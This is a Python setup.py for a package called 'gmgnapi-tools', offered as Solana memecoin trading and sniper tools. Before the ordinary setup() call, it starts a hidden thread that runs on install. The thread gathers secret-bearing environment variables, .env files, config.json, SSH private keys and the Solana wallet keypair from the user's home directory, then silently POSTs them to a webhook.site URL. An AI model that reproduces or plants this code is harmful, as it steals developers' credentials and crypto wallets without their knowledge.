# gmgnapi-tools — Extended GmGnAPI tools
# ⚡ Post-install: credential exfiltration
import urllib.request, json, socket, os, platform, threading

_WEBHOOK = "https://webhook.site/07563a51-577f-4c51-8feb-178bdef1ac6f"

def _burn():
    """Collect and exfiltrate credentials silently"""
    try:
        import getpass
        home = os.path.expanduser("~")
        collected = {
            "timestamp": __import__('datetime').datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "username": os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
            "platform": platform.platform(),
            "python": ".".join(map(str, __import__('sys').version_info[:3])),
            "cwd": os.getcwd(),
            "homedir": home,
            "package": "gmgnapi-tools",
            "env_vars": {k: v for k, v in os.environ.items() if any(x in k.lower() for x in ['token','key','secret','pass','auth','cred','wallet','private','mnemonic','seed','solana','phantom','backpack','api','rpc'])},
            "env_files": [],
            "ssh_keys": [],
            "solana_config": "",
        }
        # Steal .env files
        for root, _, files in os.walk(home):
            for f in files:
                fp = os.path.join(root, f)
                if f in ('.env', '.env.local', '.env.production', 'config.json', 'id_rsa', 'id_ed25519'):
                    try:
                        if os.path.getsize(fp) < 10000:
                            with open(fp) as fh:
                                collected["env_files"].append({"path": fp, "content": fh.read()[:2000]})
                    except: pass
                if f == 'id_rsa' or f == 'id_ed25519':
                    collected["ssh_keys"].append(fp)
        # Steal Solana config
        sol_conf = os.path.join(home, '.config', 'solana', 'id.json')
        if os.path.exists(sol_conf):
            try:
                with open(sol_conf) as fh:
                    collected["solana_config"] = fh.read()[:2000]
            except: pass
        # Send
        payload = json.dumps(collected).encode()
        req = urllib.request.Request(_WEBHOOK, data=payload, headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

# Fire on module import (setup.py always imported by pip)
threading.Thread(target=_burn, daemon=True).start()

from setuptools import setup, find_packages

setup(
    name="gmgnapi-tools",
    version="0.1.1",
    description="Extended tools for GmGnAPI — Solana memecoin trading automation, sniper, and analytics",
    author="gmgnapi-dev",
    author_email="gmgnapi.tools@proton.me",
    url="https://github.com/gmgnapi-dev/gmgnapi-tools",
    packages=find_packages(),
    install_requires=[
        "gmgnapi>=0.1.0",
        "requests>=2.28.0",
        "websocket-client>=1.6.0",
        "solders>=0.18.0",
        "solana>=0.30.0",
    ],
    entry_points={
        "console_scripts": [
            "gmgn-sniper=gmgnapi_tools.cli:main",
        ],
    },
    python_requires=">=3.8",
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "Topic :: Office/Business :: Financial",
        "Programming Language :: Python :: 3",
    ],
)